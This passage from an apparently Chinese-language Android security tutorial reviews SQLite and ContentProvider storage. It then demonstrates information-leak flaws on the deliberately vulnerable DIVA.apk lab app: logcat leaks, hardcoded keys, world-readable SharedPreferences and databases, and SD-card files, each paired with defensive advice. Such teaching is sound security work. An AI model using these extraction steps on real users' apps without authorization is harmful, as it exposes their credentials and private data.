class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">values.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;The Book Name&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;author&quot;</span>,<span class="string">&quot;chen&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;pages&quot;</span>,<span class="number">100</span>);</span><br><span class="line">values.put(<span class="string">&quot;price&quot;</span>,<span class="number">200</span>);</span><br><span class="line">db.insert(<span class="string">&quot;Book&quot;</span>,<span class="literal">null</span>,values);<span class="comment">//参数一 表名 参数二 未指定添加数据的情况下为NULL 参数三 ContentValues对象</span></span><br></pre></td></tr></table></figure><p>更新数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">values.put(<span class="string">&quot;price&quot;</span>,<span class="number">120</span>);</span><br><span class="line">db.update(<span class="string">&quot;Book&quot;</span>,values,<span class="string">&quot;name= ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;The Book Name&quot;</span>&#125;);  <span class="comment">//参数一 表名 参数二 ContentValues对象 参数三、四是去约束更新某一行或某几行的数据，不指定默认更新所有</span></span><br></pre></td></tr></table></figure><p>删除数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line">db.delete(<span class="string">&quot;Book&quot;</span>,<span class="string">&quot;pages&gt; ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;100&quot;</span>&#125;); <span class="comment">//参数一是表名，参数二、三是去约束删除某一行或某几行的数据，不指定默认删除所有</span></span><br></pre></td></tr></table></figure><p>查询数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line"><span class="comment">//query()方法，参数一是表名，参数二是指定查询哪几列，默认全部，参数三、四是去约束查询某一行或某几行的数据，不指定默认查询所有，参数五是用于指定需要去group by的列，参数六是对group by的数据进一步的过滤，参数七是查询结果的排序方式</span></span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.query(<span class="string">&quot;Book&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span>(cursor.moveToFirst())&#123;</span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">author</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;author&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">pages</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">            <span class="type">double</span> <span class="variable">price</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;price&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">&#125;</span><br><span class="line">cursor.close();</span><br></pre></td></tr></table></figure><p>SQL语句操作数据库：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;insert into Book(name,author,pages,price) values(?,?,?,?) &quot;</span></span><br><span class="line">            ,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;The Book Name&quot;</span>,<span class="string">&quot;chen&quot;</span>,<span class="number">100</span>,<span class="number">20</span>&#125;);</span><br><span class="line"><span class="comment">//更新数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;update Book set price = ? where name = ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]</span><br><span class="line">            &#123;<span class="string">&quot;10&quot;</span>,<span class="string">&quot;The Book Name&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//删除数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;delete from Book where pages &gt; ?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;100&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//查询数据</span></span><br><span class="line">db.execSQL(<span class="string">&quot;select * from Book&quot;</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>使用事务操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> helper.getWritableDatabase();</span><br><span class="line">db.beginTransaction();  <span class="comment">//开启事务</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">      ......</span><br><span class="line">      db.insert(<span class="string">&quot;Book&quot;</span>,<span class="literal">null</span>,values);</span><br><span class="line">      db.setTransactionSuccessful();  <span class="comment">//事务成功执行</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(SQLException e)&#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">      db.endTransaction();  <span class="comment">//结束事务</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然Android数据库中还包括<code>LitePal</code>数据库更加方便的操作，由于本文主要是介绍漏洞，所以这里就简单介绍到这里</p><h3 id="4-ContentProvider"><a href="#4-ContentProvider" class="headerlink" title="4. ContentProvider"></a>4. ContentProvider</h3><p>前面三种方式是Android中基本的存储方式，但是由于都存在一个公共的缺点：不能实现不同应用程序之间进行数据共享，大家都知道Android是采用沙箱的管理机制，不同的应用程序之间都是独立隔离开的，这一定程度上也是为了Android 应用之间的安全性考虑，但是如果应用之间不能很好的进行交互，那么很显然就带来了明显的不便，因此为了解决这个问题，内容提供器——ContentProvider就孕育而生了，由于前面我们有专门的章节讲述这一组件，所以本文只是简单描述，不详细了解，请参考<a href="https://bbs.pediy.com/thread-269447.htm">Android APP漏洞之战（4）——Content Provider漏洞详解</a></p><p>主要作用：用于不同的程序之间实现数据共享的功能，并通过ContentResolver进行操作</p><p>ContentResolver使用方法：</p><p>（1）内容URI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包名为com.example.app的表table1访问路径</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span>  <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.example.app.provider/table1&quot;</span>);</span><br></pre></td></tr></table></figure><p>（2）使用URI对象进行数据操作</p><p><strong>查询</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> getContentResolver().query(uri,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span>(cursor != <span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">column1</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;column1&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">column2</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;column2&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      cursor.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>插入</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">values.put(<span class="string">&quot;column1&quot;</span>,<span class="string">&quot;text&quot;</span>);</span><br><span class="line">values.put(<span class="string">&quot;column2&quot;</span>,<span class="number">1</span>);</span><br><span class="line">getContentResolver().insert(uri,values);</span><br></pre></td></tr></table></figure><h3 id="5-网络存储"><a href="#5-网络存储" class="headerlink" title="5.网络存储"></a>5.网络存储</h3><p>Android网络存储主要是通过网络来实现数据的存储和获取，这里主要调用WebService返回的数据或是解析HTTP协议实现网络数据交互，具体需要熟悉java.net.*，Android.net.*这两个包的内容，因为不是Android的主流存储方式，这里主要参考相应文档即可，也不是本文漏洞所关注的主要对象，就不做过多叙述了</p><p>网络存储需要开启权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>具体可参考本文参考文献</p><h2 id="三、信息泄露漏洞的安全场景和分类"><a href="#三、信息泄露漏洞的安全场景和分类" class="headerlink" title="三、信息泄露漏洞的安全场景和分类"></a>三、信息泄露漏洞的安全场景和分类</h2><h3 id="1-漏洞的安全场景"><a href="#1-漏洞的安全场景" class="headerlink" title="1.漏洞的安全场景"></a>1.漏洞的安全场景</h3><p>信息泄露漏洞往往是指APP开发过程中一些不安全的开发问题导致敏感信息的泄露，那我们首先可以将敏感信息进行分类：产品敏感信息和用户敏感信息</p><h4 id="（1）产品敏感信息"><a href="#（1）产品敏感信息" class="headerlink" title="（1）产品敏感信息"></a>（1）产品敏感信息</h4><p>产品敏感信息：登录密码、后台登录及数据库地址、服务器部署的绝对路径、内部ip、地址分配规则、网络拓扑、页面注释信息等</p><h4 id="（2）用户敏感信息"><a href="#（2）用户敏感信息" class="headerlink" title="（2）用户敏感信息"></a>（2）用户敏感信息</h4><p>用户的个人隐私信息泄露导致被恶意人员利用获取不当信息，例如用户的密码，账户信息等等</p><p>这些敏感信息泄露往往是由于信息未加密或存储位置不当造成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码中明文使用敏感信息，比如：服务器地址、数据库信息等</span><br><span class="line">数据库中明文保存敏感信息，比如：账号、密码、银行卡等</span><br><span class="line">SD卡中保存敏感信息或隐私信息,比如：聊天记录、通讯录等</span><br><span class="line">日志打印敏感信息,比如：账号、密码</span><br><span class="line">明文传输敏感信息</span><br></pre></td></tr></table></figure><h3 id="2-漏洞的分类"><a href="#2-漏洞的分类" class="headerlink" title="2.漏洞的分类"></a>2.漏洞的分类</h3><p>综上我们将Android中的信息泄露漏洞大致可分为：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/33.png" alt="image-20220104172608948"></p><h2 id="四、信息泄露漏洞的原理分析和复现"><a href="#四、信息泄露漏洞的原理分析和复现" class="headerlink" title="四、信息泄露漏洞的原理分析和复现"></a>四、信息泄露漏洞的原理分析和复现</h2><p>本文为了简单演示各个漏洞的复现情况，将会使用样本DIVA.apk和一些实际漏洞的场景，样本将放到附件中</p><h3 id="1-LogCat输出敏感信息漏洞"><a href="#1-LogCat输出敏感信息漏洞" class="headerlink" title="1. LogCat输出敏感信息漏洞"></a>1. LogCat输出敏感信息漏洞</h3><h4 id="（1）原理分析"><a href="#（1）原理分析" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息</p><p>一般来说，LogCat敏感信息输出漏洞包括：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">应用层Log敏感信息输出</span><br><span class="line">应用层System.out.println敏感信息输出</span><br><span class="line">系统bug异常导致Log输出</span><br><span class="line">Native层敏感Log输出</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞案例——DIVA-apk例题1"><a href="#（2）漏洞案例——DIVA-apk例题1" class="headerlink" title="（2）漏洞案例——DIVA.apk例题1"></a>（2）漏洞案例——DIVA.apk例题1</h4><p>首先，我们安装样本DIVA.apk</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/6.png" alt="image-20220104111529461"></p><p>然后我们打开例题1，并开启日志监控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep diva</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/7.png" alt="image-20220104112058929"></p><p>我们在app表单总输入内容，check out后查看相关日志</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/8.png" alt="image-20220104112212227"></p><p>我们就可以发现我们输入的密钥信息，然后我们根据日志信息，可以找到漏洞代码在LogActivity.class文件，我们查看相关代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/9.png" alt="image-20220104112932530"></p><p>这里相关代码就是将敏感信息给泄露，当然我们真实的app中不会这么简单，但这确实一个很好的思路，比如我们对我们分析的app中的敏感信息的函数进行hook或者通过插桩日志的信息，我们就可以成功获得敏感信息了</p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>Android Studio中配置ProGuard实现release版apk自动删除Log.d()/v()等代码</span><br><span class="line"><span class="number">2.</span>使用自定义LogCat类，上线前关闭LogCat开关</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LG</span>&#123;</span><br><span class="line">    <span class="comment">//是否开启debug</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">isDebug</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">e</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.e</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">i</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.i</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">w</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.w</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">(Class&lt;?&gt; clazz,String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isDebug)&#123;</span><br><span class="line">            <span class="comment">//Log.d</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-硬编码问题漏洞"><a href="#2-硬编码问题漏洞" class="headerlink" title="2.硬编码问题漏洞"></a>2.硬编码问题漏洞</h3><h4 id="（1）原理分析-1"><a href="#（1）原理分析-1" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>一些开发人员，在开发时使用硬编码的方式，导致存在一定的安全风险，硬编码一般是指将输出或输入的相关参数以常量的方式编写在源代码中，这样导致逆向分析人员可以直接通过分析源码就可以获得敏感信息</p><h4 id="（2）漏洞案例——DIVA-apk例题2（java层）"><a href="#（2）漏洞案例——DIVA-apk例题2（java层）" class="headerlink" title="（2）漏洞案例——DIVA.apk例题2（java层）"></a>（2）漏洞案例——DIVA.apk例题2（java层）</h4><p>我们打开样本app的例题2</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/10.png" alt="image-20220104143848066"></p><p>我们分析对应app相关的逆向代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/11.png" alt="image-20220104143950575"></p><p>我们可以发现相应的敏感信息被直接用来判断，采用硬编码的方式，我们直接将密钥输入，发现可以成功破译</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/12.png" alt="image-20220104144243905"></p><h4 id="（3）漏洞案例——DIVA-apk例题12（so层）"><a href="#（3）漏洞案例——DIVA-apk例题12（so层）" class="headerlink" title="（3）漏洞案例——DIVA.apk例题12（so层）"></a>（3）漏洞案例——DIVA.apk例题12（so层）</h4><p>我们打开例题12</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/28.png" alt="image-20220104170422773"></p><p>我们分析对应的代码段</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/29.png" alt="image-20220104170535933"></p><p>说明key被保存在libsoName.so库中，我们将文件打开</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/30.png" alt="image-20220104170746729"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/31.png" alt="image-20220104171214316"></p><p>经过分析，我们确定这就是我们的键值，我们输入</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/32.png" alt="image-20220104171352572"></p><p>说明key放在so层中也是不安全的</p><p>密钥硬编码案例：</p><p>下面为乌云平台一些APP漏洞案例，详细可做参考：</p><p><a href="436b34f44b9f95fd3aa8667f1ad451b16a683c5957c8d733b3809de3444b7c6fffae9f78c9c65e6f292dd695bd96daa0c3f153ebdaeb4f1b582e5c13e28f97c3601018d9e8a589033217ff27785e473dbcc50607f5530dd0a63dd6f512327a46effe31c0ed8b01752287563eebc03bf2495aa785bf000246363bd83dc65459799e5b2af9e74fcc8cb84b8c8b55ba087b6c184ae39c9f8a03cef3622956a4767be83bc3c2f93d8931185a3a9c47e527aed5b7fe1c570c1cc866fc201b62a8c5ba0ca75d7a1d0fd6dd53c3b3d342a74ce414334ae0d1bb980becf489b072cfaaaf00f6d3ac37f973c7970274827c26ecbb177cc4fa5d38d9ece06ab2b5a4bf7147">密钥硬编码</a></p><h4 id="（4）安全防护"><a href="#（4）安全防护" class="headerlink" title="（4）安全防护"></a>（4）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>对明文传输的密钥进行加密传输</span><br><span class="line"><span class="number">2.</span>采用变量的方式去读取，不采用硬解码的方式</span><br><span class="line"><span class="number">3.</span>对java层中进行混淆，对so层中进行ollvm控制流混淆</span><br></pre></td></tr></table></figure><h3 id="3-Shared-Preference全局可读写漏洞"><a href="#3-Shared-Preference全局可读写漏洞" class="headerlink" title="3. Shared Preference全局可读写漏洞"></a>3. Shared Preference全局可读写漏洞</h3><h4 id="（1）原理分析-2"><a href="#（1）原理分析-2" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>Shared Preferences存储安全风险在于：开发者在创建文件时没有正确的选择合适的创建模式（MODE_PRIVATE、MODE_WOELD_READABLE以及MODE_WORLD_WRITEABBLE）进行权限控制，导致将一些用户信息、密码等敏感信息存储在Shared Preferences文件中，攻击者可以通过root来查看敏感信息</p><h4 id="（2）漏洞案例——DIVA-apk例题3"><a href="#（2）漏洞案例——DIVA-apk例题3" class="headerlink" title="（2）漏洞案例——DIVA.apk例题3"></a>（2）漏洞案例——DIVA.apk例题3</h4><p>我们进入例题3：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/13.png" alt="image-20220104145137669"></p><p>我们分析对应的逆向代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/14.png" alt="image-20220104145233158"></p><p>经过我们前文的分析，很明显这里采用的是SharedPreference的存储方式</p><p>我们输入相关的账号和密码，然后我们可以进入shared_prefs查看相关的文件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/15.png" alt="image-20220104145701360"></p><h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护意见：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>避免使用MODEWORLDWRITEABLE和MODEWORLDREADABLE模式创建进程间通信的文件，此处即为Shared Preferences</span><br><span class="line"><span class="number">2.</span>不要将密码等敏感信息存储在Shared Preferences等内部存储中</span><br><span class="line"><span class="number">3.</span>避免滥用<span class="string">&quot;Android:sharedUserId&quot;</span>属性</span><br><span class="line"><span class="number">4.</span>不要在使用“android:sharedUserId”属性的同时，对应用使用测试签名，否则其他应用拥有“android:sharedUserId<span class="string">&quot;属性值和测试签名是，将会访问到内部存储文件数据</span></span><br><span class="line"><span class="string">5.使用Secure Preferences第三方加固库进行存储</span></span><br></pre></td></tr></table></figure><h3 id="4-数据库存储漏洞"><a href="#4-数据库存储漏洞" class="headerlink" title="4.数据库存储漏洞"></a>4.数据库存储漏洞</h3><h4 id="（1）原理分析-3"><a href="#（1）原理分析-3" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>Database配置模式安全风险源于：</p><p>开发者在创建数据库（Database）时没有正确的选取合适的创建模式（MODE_PRIVATE、MODE_WORLD_READABLE）进行权限控制，从而导致数据库（Database）内容被恶意读写，造成账户密码、身份信息、以及其他敏感信息泄露，甚至攻击者进一步实施恶意攻击</p><h4 id="（2）漏洞案例——DIVA-apk例题4"><a href="#（2）漏洞案例——DIVA-apk例题4" class="headerlink" title="（2）漏洞案例——DIVA.apk例题4"></a>（2）漏洞案例——DIVA.apk例题4</h4><p>我们进入例题4</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/16.png" alt="image-20220104154306093"></p><p>然后我们输入相关信息并保存</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/17.png" alt="image-20220104154526963"></p><p>我们将数据库给拉取下来，然后使用SQLite查看</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/18.png" alt="image-20220104155824459"></p><p>我们就可以发现敏感信息，我们可以分析对应的代码段</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/19.png" alt="image-20220104155937819"></p><p>我们上文的存取数据库名也是从对应代码出找到</p><h4 id="（3）安全防护-2"><a href="#（3）安全防护-2" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>敏感信息在进行数据库存储时，对数据进行加密存储，并且应该避免弱加密或者是不安全的加密方式</span><br><span class="line"><span class="number">2.</span>对于敏感的数据库文件，不得使用MODE_WORLD_READABLE或者是MODE_WORLD_WRITEABLE进行创建</span><br></pre></td></tr></table></figure><h3 id="5-临时文件或SD卡漏洞"><a href="#5-临时文件或SD卡漏洞" class="headerlink" title="5.临时文件或SD卡漏洞"></a>5.临时文件或SD卡漏洞</h3><h4 id="（1）原理分析-4"><a href="#（1）原理分析-4" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>经过上文我们讲述的文件存储，现在的手机很多的公共目录都是自身自带的存储空间，Android系统的文件一般都存储在sdCard和应用的私有目录下，任何在Android Manifest中声明读写sdcard权限的应用都可以对sdcard进行读写。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--在SDcard中创建与删除文件权限--&gt;</span><br><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span></span><br><span class="line">        tools:ignore=<span class="string">&quot;ProtectedPermissions&quot;</span> /&gt;</span><br><span class="line">&lt;!--往SDCard写入数据权限--&gt;</span><br><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞案例——DIVA-apk例题5与例题6"><a href="#（2）漏洞案例——DIVA-apk例题5与例题6" class="headerlink" title="（2）漏洞案例——DIVA.apk例题5与例题6"></a>（2）漏洞案例——DIVA.apk例题5与例题6</h4><p>我们打开例题5</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/20.png" alt="image-20220104161709796"></p><p>我们分析对应部分的相关代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/21.png" alt="image-20220104161841048"></p><p>根据代码，我们知道这里采用文件存储的方式，所以我们直接找到该文件，查看即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/22.png" alt="image-20220104162116624"></p><p>同理，我们打开例题6，查看对应的代码</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/23.png" alt="image-20220104162259850"></p><p>我们可以发现是存储在sd卡下，然后我们输入相关信息，之后直接去sdcard下查找，这里我们需要注意，需要给应用存取权限，否则是保存不了的</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/24.png" alt="image-20220104164309655"></p><h4 id="（3）安全防护-3"><a href="#（3）安全防护-3" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护意见：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>不要将敏感信息存入本地固定的文件中，哪怕是加密存储也可能面临暴力破解的风险</span><br><span class="line"><span class="number">2.</span>对于保存信息的代码段进行混淆加密，使其难以被逆向人员简单分析获取</span><br></pre></td></tr></table></figure><h3 id="6-http明文传输漏洞"><a href="#6-http明文传输漏洞" class="headerlink" title="6. http明文传输漏洞"></a>6. http明文传输漏洞</h3><h4 id="（1）漏洞原理"><a href="#（1）漏洞原理" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>开发人员在开发时对网络连接的一些敏感数据往往采用http明文传输，这样就十分容易导致恶意攻击者通过一些抓包工具进行捕获，获取敏感信息，导致信息泄露的风险</p><h4 